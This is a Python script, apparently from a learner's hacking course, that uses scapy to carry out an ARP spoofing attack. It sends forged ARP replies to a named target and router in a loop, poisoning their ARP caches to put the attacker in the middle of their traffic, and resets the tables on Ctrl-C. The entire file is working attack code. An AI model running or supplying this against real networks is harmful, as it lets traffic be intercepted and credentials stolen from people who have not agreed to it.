#!/usr/env/bin python

import scapy.all as scapy
import time
import optparse
import sys

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("--target","-t", dest = "target", help = "Target's IP address")
    parser.add_option("--router","-r", dest = "router", help = "Router's IP address")
    (options, arguments) = parser.parse_args()

    if not options.target:
        parser.error("Target IP not specified")
    if not options.router:
        parser.error("Router IP not specified")

    return options

def get_mac(ip):
    arp_request = scapy.ARP()
    #pdst is the field of ip, can use ls with scapy.arp to confirm
    arp_request.pdst = ip
    broadcast = scapy.Ether()
    #dst is the field of the destination mac and ffx6 is the broadcast mac
    broadcast.dst = "ff:ff:ff:ff:ff:ff"
    #combination of the two packets above
    request_all = broadcast/arp_request
    #srp returns 2 values,list of answered packets and list of unanswered packets; we only need answered hence [0] i.e 1st
    #element
    #false verbose is to instruct srp to not print out shit a user doesn't need
    answered_list = scapy.srp(request_all, timeout = 1, verbose = False)[0]
    #the answered list in itself contains 2 elements, packets sent and the answer
    #looking at the first element in the list and finding the answer's hardware source i.e. mac adress
    return answered_list[0][1].hwsrc

def change_ip(target_ip, fake_ip):
    #making a ARP packet, op = 2 means I'm looking for a ARP response, not a request. psrc -> source IP, changing it to the IP
    #of the router
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = fake_ip)
    scapy.send(packet, verbose = False)

#to restore the ARP table after the attack
def restore(destination_ip, source_ip):
    #if not specified, scapy puts in my mac
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = get_mac(destination_ip), psrc = source_ip, hwsrc = get_mac(source_ip))
    #sending the packet 5 times just to confirm the target gets it
    scapy.send(packet, count = 5, verbose = False)

options = get_arguments()
count = 0
try:
    while True:
        change_ip(options.target,options.router)
        change_ip(options.router,options.target)
        count = count + 2
        #can't join an int and a string; the , stops print from going to the next line. \r -> start printing from the start of the
        #line
        print("\r" + str(count) + " packets sent"),
        #now the print statement is waiting for the end of execution to print so we're flushing the buffer
        sys.stdout.flush()
        #wait 2 seconds before sending the next request
        time.sleep(2)
#saving myself from the ugly message seen after ctrl C
except KeyboardInterrupt:
    print("\nResetting ARP tables")
    restore(options.target, options.router)
    restore(options.router, options.target)
